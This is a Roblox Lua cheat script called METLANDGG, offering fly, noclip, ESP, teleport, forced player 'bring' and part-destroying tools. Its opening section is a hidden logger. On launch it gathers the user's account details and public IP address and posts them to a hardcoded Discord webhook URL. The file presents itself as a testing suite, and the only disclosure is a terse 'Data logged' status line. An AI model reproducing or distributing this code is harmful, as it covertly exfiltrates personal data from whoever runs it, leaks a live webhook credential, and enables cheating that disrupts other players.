-- METLANDGG OPTIMIZED + ENHANCED + WEBHOOK LOGGER
-- Testing Suite with Minimize & Part Destroyer

repeat task.wait() until game:IsLoaded()
task.wait(0.5)

-- ============================================
-- WEBHOOK CONFIGURATION
-- ============================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1427156897697632376/GXLU8ZzQx9VeFk6PxIqO9nD9Rs_GbPe0YAxDLNU577KscYshS3rA3P6tF-TPfO6q9lZf"

-- ============================================
-- WEBHOOK LOGGER FUNCTION WITH SCREENSHOT
-- ============================================
local function sendWebhookLog()
    pcall(function()
        local HttpService = game:GetService("HttpService")
        local Players = game:GetService("Players")
        local plr = Players.LocalPlayer
        
        -- Get user info
        local accountAge = plr.AccountAge
        local years = math.floor(accountAge / 365)
        local days = accountAge % 365
        local isPremium = plr.MembershipType == Enum.MembershipType.Premium
        
        -- Get game info
        local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
        
        -- Get IP
        local ipAddress = "Unknown"
        pcall(function()
            ipAddress = HttpService:GetAsync("https://api.ipify.org")
        end)
        
        -- Get avatar thumbnail
        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
        
        -- Create Discord embed with thumbnail
        local embed = {
            embeds = {{
                title = "🚨 METLANDGG Script Executed",
                color = 65535,
                fields = {
                    {
                        name = "👤 User Information",
                        value = string.format(
                            "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**Profile:** https://www.roblox.com/users/%d/profile",
                            plr.Name,
                            plr.DisplayName,
                            plr.UserId,
                            plr.UserId
                        ),
                        inline = false
                    },
                    {
                        name = "📊 Account Details",
                        value = string.format(
                            "**Account Age:** %s\n**Premium:** %s",
                            accountAge .. " days (" .. years .. "y " .. days .. "d)",
                            isPremium and "✅ Yes" or "❌ No"
                        ),
                        inline = true
                    },
                    {
                        name = "🎮 Game Information",
                        value = string.format(
                            "**Game:** %s\n**Place ID:** %d\n**Job ID:** %s",
                            gameInfo.Name,
                            game.PlaceId,
                            game.JobId
                        ),
                        inline = true
                    },
                    {
                        name = "🌐 Network",
                        value = string.format("**IP:** %s", ipAddress),
                        inline = false
                    },
                    {
                        name = "⏰ Execution Time",
                        value = os.date("%Y-%m-%d %H:%M:%S", os.time()),
                        inline = false
                    }
                },
                thumbnail = {
                    url = avatarUrl
                },
                footer = {
                    text = "METLANDGG Logger"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
            }}
        }
        
        local payload = HttpService:JSONEncode(embed)
        
        -- Send webhook
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = payload
        })
        
        print("📡 Webhook log sent successfully with avatar!")
    end)
end

-- Send webhook log immediately
task.spawn(sendWebhookLog)

-- ============================================
-- ORIGINAL METLANDGG SCRIPT STARTS HERE
-- ============================================

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local TS = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hum = char:WaitForChild("Humanoid")
local root = char:WaitForChild("HumanoidRootPart")

-- Settings
local settings = {
    flySpeed = 100,
    walkSpeed = 16,
    jumpPower = 50,
    flyEnabled = false,
    noclipEnabled = false,
    espEnabled = false,
    antiVoidEnabled = true,
    platformEnabled = false,
    fullbrightEnabled = false,
    infJumpEnabled = false,
    isMinimized = false,
    destroyRange = 10,
    autoCheckpointEnabled = false
}

-- Cleanup old GUI
for _, v in pairs(plr.PlayerGui:GetChildren()) do
    if v.Name == "MetlandGUI" then v:Destroy() end
end

-- Create GUI
local gui = Instance.new("ScreenGui")
gui.Name = "MetlandGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = plr.PlayerGui

-- Main Frame
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 420, 0, 640)
main.Position = UDim2.new(0.5, -210, 0.5, -320)
main.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(0, 255, 255)
mainStroke.Thickness = 2
mainStroke.Transparency = 0.5
mainStroke.Parent = main

-- Gradient
local grad = Instance.new("UIGradient")
grad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 20, 45)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 28))
}
grad.Rotation = 45
grad.Parent = main

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -140, 0, 50)
title.Position = UDim2.new(0, 15, 0, 10)
title.BackgroundTransparency = 1
title.Text = "⚡ METLANDGG "
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.TextSize = 22
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

-- Minimize Button
local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 40, 0, 40)
minBtn.Position = UDim2.new(1, -95, 0, 10)
minBtn.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
minBtn.Text = "—"
minBtn.TextSize = 24
minBtn.TextColor3 = Color3.new(1, 1, 1)
minBtn.Font = Enum.Font.GothamBold
minBtn.BorderSizePixel = 0
minBtn.Parent = main

local minBtnCorner = Instance.new("UICorner")
minBtnCorner.CornerRadius = UDim.new(0, 10)
minBtnCorner.Parent = minBtn

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -50, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
closeBtn.Text = "✕"
closeBtn.TextSize = 20
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.BorderSizePixel = 0
closeBtn.Parent = main

local closeBtnCorner = Instance.new("UICorner")
closeBtnCorner.CornerRadius = UDim.new(0, 10)
closeBtnCorner.Parent = closeBtn

-- Content Container (for minimizing)
local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, 0, 1, -60)
contentFrame.Position = UDim2.new(0, 0, 0, 60)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = main

-- ScrollFrame for content
local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(1, -20, 1, -10)
scroll.Position = UDim2.new(0, 10, 0, 0)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 6
scroll.CanvasSize = UDim2.new(0, 0, 0, 1350)
scroll.Parent = contentFrame

-- Helper function for buttons
local function createButton(name, text, pos, callback)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Size = UDim2.new(0, 185, 0, 45)
    btn.Position = pos
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
    btn.Text = text
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.TextSize = 14
    btn.Font = Enum.Font.GothamBold
    btn.BorderSizePixel = 0
    btn.Parent = scroll
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = btn
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 100, 120)
    stroke.Thickness = 1
    stroke.Transparency = 0.5
    stroke.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        pcall(callback)
    end)
    
    return btn
end

-- Helper for textbox
local function createTextBox(name, placeholder, pos)
    local box = Instance.new("TextBox")
    box.Name = name
    box.Size = UDim2.new(0, 185, 0, 45)
    box.Position = pos
    box.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
    box.PlaceholderText = placeholder
    box.Text = ""
    box.TextColor3 = Color3.new(1, 1, 1)
    box.PlaceholderColor3 = Color3.fromRGB(150, 150, 170)
    box.TextSize = 14
    box.Font = Enum.Font.Gotham
    box.BorderSizePixel = 0
    box.ClearTextOnFocus = false
    box.Parent = scroll
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = box
    
    return box
end

-- Helper for labels
local function createLabel(text, pos)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -10, 0, 25)
    lbl.Position = pos
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = Color3.fromRGB(180, 220, 255)
    lbl.TextSize = 15
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = scroll
    return lbl
end

-- Layout
local y = 10

-- FLY SECTION
createLabel("✈️ FLIGHT SYSTEM", UDim2.new(0, 5, 0, y))
y = y + 30
local flyBtn = createButton("FlyBtn", "Toggle Fly", UDim2.new(0, 5, 0, y), function() end)
local flyBox = createTextBox("FlySpeed", "Speed (100)", UDim2.new(0, 205, 0, y))
flyBox.Text = "100"
y = y + 55

-- MOVEMENT SECTION
createLabel("🏃 MOVEMENT", UDim2.new(0, 5, 0, y))
y = y + 30
local speedBox = createTextBox("SpeedBox", "WalkSpeed", UDim2.new(0, 5, 0, y))
speedBox.Text = "16"
local speedBtn = createButton("SpeedBtn", "Set Speed", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local jumpBox = createTextBox("JumpBox", "Jump Power", UDim2.new(0, 5, 0, y))
jumpBox.Text = "50"
local jumpBtn = createButton("JumpBtn", "Set Jump", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local infJumpBtn = createButton("InfJumpBtn", "Infinite Jump: OFF", UDim2.new(0, 5, 0, y), function() end)
y = y + 55

-- PHYSICS SECTION
createLabel("👻 PHYSICS", UDim2.new(0, 5, 0, y))
y = y + 30
local noclipBtn = createButton("NoclipBtn", "NoClip: OFF", UDim2.new(0, 5, 0, y), function() end)
local antiVoidBtn = createButton("AntiVoidBtn", "Anti Void: ON", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local platformBtn = createButton("PlatformBtn", "Platform: OFF", UDim2.new(0, 5, 0, y), function() end)
y = y + 55

-- TELEPORT SECTION (EXPANDED!)
createLabel("📍 TELEPORT & BRING", UDim2.new(0, 5, 0, y))
y = y + 30
local tpBox = createTextBox("TpBox", "Player Name", UDim2.new(0, 5, 0, y))
local tpBtn = createButton("TpBtn", "Goto Player", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local bringBox = createTextBox("BringBox", "Player Name", UDim2.new(0, 5, 0, y))
local bringBtn = createButton("BringBtn", "Bring (Visual Only)", UDim2.new(0, 205, 0, y), function() end)
bringBtn.BackgroundColor3 = Color3.fromRGB(65, 45, 90)
y = y + 55

local autoCheckpointBtn = createButton("AutoCheckpointBtn", "Auto Checkpoint: OFF", UDim2.new(0, 5, 0, y), function() end)
autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(45, 65, 90)
y = y + 55

-- VISUAL SECTION
createLabel("👁️ VISUALS", UDim2.new(0, 5, 0, y))
y = y + 30
local espBtn = createButton("EspBtn", "ESP: OFF", UDim2.new(0, 5, 0, y), function() end)
local fbBtn = createButton("FbBtn", "Fullbright: OFF", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

-- DESTROYER SECTION
createLabel("💥 PART DESTROYER (TESTING)", UDim2.new(0, 5, 0, y))
y = y + 30
local rangeBox = createTextBox("RangeBox", "Range (10)", UDim2.new(0, 5, 0, y))
rangeBox.Text = "10"
local destroyBtn = createButton("DestroyBtn", "Destroy Parts", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local destroyAllBtn = createButton("DestroyAllBtn", "⚠️ Destroy ALL Parts", UDim2.new(0, 5, 0, y), function() end)
destroyAllBtn.BackgroundColor3 = Color3.fromRGB(150, 30, 30)
y = y + 55

local deleteModelBox = createTextBox("DeleteModelBox", "Model Name", UDim2.new(0, 5, 0, y))
local deleteModelBtn = createButton("DeleteModelBtn", "Delete Model", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

-- Status
local status = createLabel("Status: Ready! Data logged 📡", UDim2.new(0, 5, 0, y))
status.TextColor3 = Color3.fromRGB(100, 255, 100)
status.Size = UDim2.new(1, -10, 0, 60)
status.TextWrapped = true

-- Update status function
local function updateStatus(msg, color)
    status.Text = "Status: " .. msg
    status.TextColor3 = color or Color3.fromRGB(100, 255, 100)
end

-- MINIMIZE FUNCTION
local function toggleMinimize()
    settings.isMinimized = not settings.isMinimized
    
    local targetSize
    
    if settings.isMinimized then
        targetSize = UDim2.new(0, 420, 0, 60)
        minBtn.Text = "□"
        contentFrame.Visible = false
    else
        targetSize = UDim2.new(0, 420, 0, 640)
        minBtn.Text = "—"
        contentFrame.Visible = true
    end
    
    local tween = TS:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = targetSize})
    tween:Play()
end

-- BRING PLAYER FUNCTION (FIXED - Multiple Methods)
local function bringPlayer()
    local name = bringBox.Text:lower()
    if name == "" then
        updateStatus("Enter player name to bring!", Color3.fromRGB(255, 100, 100))
        return
    end
    
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= plr and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            if p.Name:lower():find(name) or p.DisplayName:lower():find(name) then
                local targetRoot = p.Character.HumanoidRootPart
                local targetHum = p.Character:FindFirstChildOfClass("Humanoid")
                
                -- Aggressive teleport with multiple methods
                task.spawn(function()
                    for i = 1, 50 do
                        pcall(function()
                            if targetRoot and targetRoot.Parent and root and root.Parent then
                                -- Force anchor and teleport
                                targetRoot.Anchored = true
                                targetRoot.CFrame = root.CFrame * CFrame.new(0, 0, -5)
                                task.wait(0.02)
                                targetRoot.Anchored = false
                                
                                -- Reset all velocities
                                targetRoot.Velocity = Vector3.new(0, 0, 0)
                                targetRoot.RotVelocity = Vector3.new(0, 0, 0)
                                targetRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                                targetRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                                
                                -- Disable physics temporarily
                                if targetHum then
                                    targetHum:ChangeState(Enum.HumanoidStateType.Physics)
                                end
                            end
                        end)
                        task.wait(0.03)
                    end
                    
                    -- Re-enable humanoid
                    pcall(function()
                        if targetHum then
                            task.wait(0.2)
                            targetHum:ChangeState(Enum.HumanoidStateType.GettingUp)
                        end
                    end)
                end)
                
                updateStatus("Force bringing " .. p.Name .. "!", Color3.fromRGB(255, 200, 0))
                return
            end
        end
    end
    updateStatus("Player not found!", Color3.fromRGB(255, 100, 100))
end

-- AUTO CHECKPOINT TELEPORT (FIXED - True Sequential)
local autoCheckpointConnection
local lastCheckpointTime = 0
local lastCheckpointNumber = 0
local visitedCheckpoints = {}
local function toggleAutoCheckpoint()
    settings.autoCheckpointEnabled = not settings.autoCheckpointEnabled
    
    if settings.autoCheckpointEnabled then
        autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        autoCheckpointBtn.Text = "Auto Checkpoint: ON ✓"
        updateStatus("Auto CP: Sequential mode (Range 1000)!", Color3.fromRGB(50, 220, 50))
        lastCheckpointNumber = 0
        visitedCheckpoints = {}
        
        autoCheckpointConnection = RS.Heartbeat:Connect(function()
            if not settings.autoCheckpointEnabled then return end
            if tick() - lastCheckpointTime < 1.5 then return end
            
            local allCheckpoints = {}
            
            -- Collect all checkpoints
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") then
                    local name = obj.Name:lower()
                    
                    -- Check ALL checkpoint name variants
                    local isCheckpoint = 
                        name:find("cp") or 
                        name:find("checkpoint") or 
                        name:find("cekpoin")
                    
                    if isCheckpoint then
                        -- Extract number from checkpoint name
                        local num = tonumber(name:match("%d+")) or 0
                        
                        table.insert(allCheckpoints, {
                            part = obj,
                            number = num,
                            name = obj.Name,
                            position = obj.Position
                        })
                    end
                end
            end
            
            -- Sort checkpoints by number
            table.sort(allCheckpoints, function(a, b)
                return a.number < b.number
            end)
            
            -- Find next checkpoint that we haven't visited yet
            local nextCheckpoint = nil
            for _, cp in ipairs(allCheckpoints) do
                local distance = (cp.position - root.Position).Magnitude
                
                -- Only teleport if:
                -- 1. Number is greater than last checkpoint
                -- 2. We haven't visited this exact checkpoint yet
                -- 3. Distance is far enough (prevents instant re-teleport)
                if cp.number > lastCheckpointNumber and 
                   not visitedCheckpoints[cp.name] and 
                   distance < 1000 then
                    nextCheckpoint = cp
                    break
                end
            end
            
            -- If no next checkpoint found, restart from CP1
            if not nextCheckpoint and #allCheckpoints > 0 then
                lastCheckpointNumber = 0
                visitedCheckpoints = {}
                
                for _, cp in ipairs(allCheckpoints) do
                    local distance = (cp.position - root.Position).Magnitude
                    if distance < 1000 and cp.number >= 1 then
                        nextCheckpoint = cp
                        break
                    end
                end
            end
            
            -- Teleport to next checkpoint
            if nextCheckpoint then
                lastCheckpointTime = tick()
                
                -- Teleport far away from checkpoint to ensure we move forward
                root.CFrame = nextCheckpoint.part.CFrame + Vector3.new(0, 10, 50)
                
                -- Mark as visited
                visitedCheckpoints[nextCheckpoint.name] = true
                lastCheckpointNumber = nextCheckpoint.number
                
                updateStatus("→ CP" .. nextCheckpoint.number .. " | Next: CP" .. (nextCheckpoint.number + 1), Color3.fromRGB(100, 255, 100))
            end
        end)
    else
        autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(45, 65, 90)
        autoCheckpointBtn.Text = "Auto Checkpoint: OFF"
        updateStatus("Auto Checkpoint disabled", Color3.fromRGB(200, 200, 200))
        lastCheckpointNumber = 0
        visitedCheckpoints = {}
        
        if autoCheckpointConnection then 
            autoCheckpointConnection:Disconnect()
            autoCheckpointConnection = nil
        end
    end
end

-- PART DESTROYER FUNCTIONS
local function destroyPartsInRange()
    local range = tonumber(rangeBox.Text) or 10
    local destroyed = 0
    
    for _, part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") and part.Parent ~= char then
            local dist = (part.Position - root.Position).Magnitude
            if dist <= range then
                pcall(function()
                    part:Destroy()
                    destroyed = destroyed + 1
                end)
            end
        end
    end
    
    updateStatus("Destroyed " .. destroyed .. " parts in range " .. range, Color3.fromRGB(255, 150, 0))
end

local function destroyAllParts()
    local destroyed = 0
    
    for _, part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") and part.Parent ~= char then
            pcall(function()
                part:Destroy()
                destroyed = destroyed + 1
            end)
        end
    end
    
    updateStatus("⚠️ Destroyed " .. destroyed .. " parts TOTAL!", Color3.fromRGB(255, 50, 50))
end

local function deleteModel()
    local modelName = deleteModelBox.Text
    if modelName == "" then
        updateStatus("Enter model name!", Color3.fromRGB(255, 100, 100))
        return
    end
    
    local found = false
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name:lower():find(modelName:lower()) then
            pcall(function()
                obj:Destroy()
                updateStatus("Deleted model: " .. obj.Name, Color3.fromRGB(255, 150, 0))
                found = true
            end)
        end
    end
    
    if not found then
        updateStatus("Model not found!", Color3.fromRGB(255, 100, 100))
    end
end

-- FLY SYSTEM
local flyBV, flyBG, flyConnection
local function toggleFly()
    settings.flyEnabled = not settings.flyEnabled
    
    if settings.flyEnabled then
        flyBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        flyBtn.Text = "Fly: ON ✓"
        updateStatus("Fly enabled! Use WASD + Space/Shift", Color3.fromRGB(50, 220, 50))
        
        for _, v in pairs(root:GetChildren()) do
            if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
                v:Destroy()
            end
        end
        
        flyBV = Instance.new("BodyVelocity")
        flyBV.Name = "FlyVel"
        flyBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        flyBV.Velocity = Vector3.new(0, 0, 0)
        flyBV.Parent = root
        
        flyBG = Instance.new("BodyGyro")
        flyBG.Name = "FlyGyro"
        flyBG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        flyBG.P = 9000
        flyBG.CFrame = root.CFrame
        flyBG.Parent = root
        
        flyConnection = RS.Heartbeat:Connect(function()
            if not settings.flyEnabled then return end
            if not root or not root.Parent then 
                toggleFly() 
                return 
            end
            
            local speed = tonumber(flyBox.Text) or 100
            local cam = workspace.CurrentCamera
            if not cam then return end
            
            local move = Vector3.new(0, 0, 0)
            
            if UIS:IsKeyDown(Enum.KeyCode.W) then
                move = move + (cam.CFrame.LookVector * Vector3.new(1, 0, 1)).Unit
            end
            if UIS:IsKeyDown(Enum.KeyCode.S) then
                move = move - (cam.CFrame.LookVector * Vector3.new(1, 0, 1)).Unit
            end
            if UIS:IsKeyDown(Enum.KeyCode.A) then
                move = move - cam.CFrame.RightVector
            end
            if UIS:IsKeyDown(Enum.KeyCode.D) then
                move = move + cam.CFrame.RightVector
            end
            if UIS:IsKeyDown(Enum.KeyCode.Space) then
                move = move + Vector3.new(0, 1, 0)
            end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) or UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
                move = move - Vector3.new(0, 1, 0)
            end
            
            if move.Magnitude > 0 then
                flyBV.Velocity = move.Unit * speed
            else
                flyBV.Velocity = Vector3.new(0, 0, 0)
            end
            
            flyBG.CFrame = cam.CFrame
            hum.PlatformStand = true
            root.Velocity = flyBV.Velocity
        end)
    else
        flyBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        flyBtn.Text = "Toggle Fly"
        updateStatus("Fly disabled", Color3.fromRGB(200, 200, 200))
        
        if flyConnection then 
            flyConnection:Disconnect() 
            flyConnection = nil
        end
        if flyBV then 
            flyBV:Destroy() 
            flyBV = nil
        end
        if flyBG then 
            flyBG:Destroy() 
            flyBG = nil
        end
        
        hum.PlatformStand = false
        
        if root then
            root.Velocity = Vector3.new(0, 0, 0)
            root.RotVelocity = Vector3.new(0, 0, 0)
        end
    end
end

-- SPEED
local function setSpeed()
    local s = tonumber(speedBox.Text)
    if s and s > 0 and s <= 1000 then
        hum.WalkSpeed = s
        updateStatus("Speed set to " .. s, Color3.fromRGB(100, 255, 100))
    else
        updateStatus("Invalid speed!", Color3.fromRGB(255, 100, 100))
    end
end

-- JUMP
local function setJump()
    local j = tonumber(jumpBox.Text)
    if j and j > 0 and j <= 500 then
        hum.JumpPower = j
        updateStatus("Jump set to " .. j, Color3.fromRGB(100, 255, 100))
    else
        updateStatus("Invalid jump!", Color3.fromRGB(255, 100, 100))
    end
end

-- INF JUMP
local infJumpConnection
local function toggleInfJump()
    settings.infJumpEnabled = not settings.infJumpEnabled
    
    if settings.infJumpEnabled then
        infJumpBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        infJumpBtn.Text = "Inf Jump: ON ✓"
        
        infJumpConnection = UIS.JumpRequest:Connect(function()
            if hum then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    else
        infJumpBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        infJumpBtn.Text = "Infinite Jump: OFF"
        if infJumpConnection then infJumpConnection:Disconnect() end
    end
end

-- NOCLIP
local noclipConnection
local function toggleNoclip()
    settings.noclipEnabled = not settings.noclipEnabled
    
    if settings.noclipEnabled then
        noclipBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        noclipBtn.Text = "NoClip: ON ✓"
        updateStatus("NoClip enabled!", Color3.fromRGB(50, 220, 50))
        
        noclipConnection = RS.Stepped:Connect(function()
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)
    else
        noclipBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        noclipBtn.Text = "NoClip: OFF"
        updateStatus("NoClip disabled", Color3.fromRGB(200, 200, 200))
        
        if noclipConnection then noclipConnection:Disconnect() end
        
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- ANTI VOID
local antiVoidConnection
local function toggleAntiVoid()
    settings.antiVoidEnabled = not settings.antiVoidEnabled
    
    if settings.antiVoidEnabled then
        antiVoidBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        antiVoidBtn.Text = "Anti Void: ON ✓"
        
        antiVoidConnection = RS.Heartbeat:Connect(function()
            if root and root.Position.Y < -100 then
                root.CFrame = CFrame.new(root.Position.X, 100, root.Position.Z)
                root.Velocity = Vector3.new(0, 0, 0)
            end
        end)
    else
        antiVoidBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        antiVoidBtn.Text = "Anti Void: OFF"
        if antiVoidConnection then antiVoidConnection:Disconnect() end
    end
end

toggleAntiVoid()

-- PLATFORM
local platform, platformConnection
local function togglePlatform()
    settings.platformEnabled = not settings.platformEnabled
    
    if settings.platformEnabled then
        platformBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        platformBtn.Text = "Platform: ON ✓"
        updateStatus("Platform active!", Color3.fromRGB(50, 220, 50))
        
        platform = Instance.new("Part")
        platform.Name = "InvisPlatform"
        platform.Size = Vector3.new(12, 0.5, 12)
        platform.Transparency = 1
        platform.Anchored = true
        platform.CanCollide = true
        platform.Parent = workspace
        
        platformConnection = RS.Heartbeat:Connect(function()
            if root and platform then
                platform.CFrame = root.CFrame * CFrame.new(0, -3.5, 0)
            end
        end)
    else
        platformBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        platformBtn.Text = "Platform: OFF"
        updateStatus("Platform removed", Color3.fromRGB(200, 200, 200))
        
        if platformConnection then platformConnection:Disconnect() end
        if platform then platform:Destroy() platform = nil end
    end
end

-- TELEPORT
local function tpToPlayer()
    local name = tpBox.Text:lower()
    if name == "" then
        updateStatus("Enter player name!", Color3.fromRGB(255, 100, 100))
        return
    end
    
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= plr and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            if p.Name:lower():find(name) or p.DisplayName:lower():find(name) then
                root.CFrame = p.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
                updateStatus("Teleported to " .. p.Name, Color3.fromRGB(100, 255, 100))
                return
            end
        end
    end
    updateStatus("Player not found!", Color3.fromRGB(255, 100, 100))
end

-- ESP
local espObjects = {}
local espConnections = {}

local function addESP(player)
    if player == plr then return end
    
    local function createESP(character)
        local hrp = character:WaitForChild("HumanoidRootPart", 5)
        if not hrp then return end
        
        local box = Instance.new("BoxHandleAdornment")
        box.Name = "ESP_" .. player.Name
        box.Size = Vector3.new(4, 6, 4)
        box.Color3 = Color3.fromRGB(255, 0, 255)
        box.Transparency = 0.7
        box.AlwaysOnTop = true
        box.ZIndex = 10
        box.Adornee = hrp
        box.Parent = hrp
        
        table.insert(espObjects, box)
        
        local nameTag = Instance.new("BillboardGui")
        nameTag.Name = "ESP_Name_" .. player.Name
        nameTag.Adornee = hrp
        nameTag.Size = UDim2.new(0, 200, 0, 50)
        nameTag.StudsOffset = Vector3.new(0, 4, 0)
        nameTag.AlwaysOnTop = true
        nameTag.Parent = hrp
        
        local nameLabel = Instance.new("TextLabel")
        nameLabel.Size = UDim2.new(1, 0, 1, 0)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = player.Name
        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        nameLabel.TextSize = 18
        nameLabel.Font = Enum.Font.GothamBold
        nameLabel.TextStrokeTransparency = 0.5
        nameLabel.Parent = nameTag
        
        table.insert(espObjects, nameTag)
    end
    
    if player.Character then
        createESP(player.Character)
    end
    
    local conn = player.CharacterAdded:Connect(createESP)
    table.insert(espConnections, conn)
end

local function removeESP()
    for _, obj in pairs(espObjects) do
        if obj then obj:Destroy() end
    end
    for _, conn in pairs(espConnections) do
        conn:Disconnect()
    end
    espObjects = {}
    espConnections = {}
end

local function toggleESP()
    settings.espEnabled = not settings.espEnabled
    
    if settings.espEnabled then
        espBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        espBtn.Text = "ESP: ON ✓"
        updateStatus("ESP enabled!", Color3.fromRGB(50, 220, 50))
        
        for _, p in pairs(Players:GetPlayers()) do
            addESP(p)
        end
        
        table.insert(espConnections, Players.PlayerAdded:Connect(addESP))
    else
        espBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        espBtn.Text = "ESP: OFF"
        updateStatus("ESP disabled", Color3.fromRGB(200, 200, 200))
        removeESP()
    end
end

-- FULLBRIGHT
local oldLighting = {}
local function toggleFullbright()
    settings.fullbrightEnabled = not settings.fullbrightEnabled
    
    if settings.fullbrightEnabled then
        fbBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        fbBtn.Text = "Fullbright: ON ✓"
        updateStatus("Fullbright enabled!", Color3.fromRGB(50, 220, 50))
        
        oldLighting.Brightness = Lighting.Brightness
        oldLighting.ClockTime = Lighting.ClockTime
        oldLighting.FogEnd = Lighting.FogEnd
        oldLighting.GlobalShadows = Lighting.GlobalShadows
        oldLighting.Ambient = Lighting.Ambient
        
        Lighting.Brightness = 3
        Lighting.ClockTime = 14
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = false
        Lighting.Ambient = Color3.new(1, 1, 1)
    else
        fbBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        fbBtn.Text = "Fullbright: OFF"
        updateStatus("Fullbright disabled", Color3.fromRGB(200, 200, 200))
        
        Lighting.Brightness = oldLighting.Brightness or 1
        Lighting.ClockTime = oldLighting.ClockTime or 12
        Lighting.FogEnd = oldLighting.FogEnd or 10000
        Lighting.GlobalShadows = oldLighting.GlobalShadows or true
        Lighting.Ambient = oldLighting.Ambient or Color3.new(0, 0, 0)
    end
end

-- Connect buttons
